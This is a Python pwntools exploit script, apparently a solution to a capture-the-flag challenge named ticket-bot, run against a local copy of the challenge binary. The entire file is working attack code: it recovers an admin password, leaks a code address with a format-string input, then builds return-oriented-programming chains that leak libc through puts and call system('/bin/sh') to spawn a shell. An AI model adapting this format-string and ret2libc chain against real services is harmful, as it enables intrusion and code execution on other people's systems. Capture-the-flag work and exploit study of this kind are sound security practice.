#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./chal_patched', checksec=False)
context.terminal = ['alacritty', '-e', 'sh', '-c']

#io = remote('ticket-bot.challs.csc.tf', 1337)
#io.recvline()

io = process('./chal_patched')

ticketId = io.recvline().decode().split()[-1]

io2 = process(['./main', ticketId])
adminPass = int(io2.recv())
print(f'Admin password: {adminPass}')
io2.close()

io.sendline(b'2')
io.sendline(str(adminPass).encode())
io.sendline(b'1')
io.sendline(b'%9$p')

io.recv()
io.recvlines(7)

leak = int(io.recvline().decode()[:14], 16)
elf.address = leak - 0x142f

pop_rdi = elf.address + 0x1653
ret = elf.address + 0x101a

io.sendline(b'2')
io.sendline(b'0')
io.sendline(b'1')

payload = flat({
    16: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.AdminMenu,
    ]
})

io.sendlineafter(b'Password', payload)

io.recvlines(7)

libc = ELF('./handout/libc.so.6', checksec=False)

addr = io.recvline()[4:]

got_puts = u64(addr[:-1].ljust(8, b'\x00'))

libc.address = got_puts - libc.symbols.puts

io.sendline(b'1')

payload = flat({
    16: [
        pop_rdi,
        next(libc.search(b'/bin/sh\00')),
        ret,
        libc.symbols.system
    ]
})

io.sendline(payload)

io.interactive()